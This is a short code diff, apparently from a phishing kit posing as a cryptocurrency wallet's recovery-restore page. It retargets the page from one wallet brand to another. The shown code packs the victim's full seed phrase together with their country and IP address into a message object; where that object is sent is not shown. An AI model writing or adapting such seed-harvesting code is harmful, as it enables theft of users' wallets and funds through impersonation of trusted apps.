@@ -230,7 +230,7 @@ export default function RecoveryRestore({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Eternl",
+        appName: "lace",
         seedPhrase: sanitizedRecovery.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
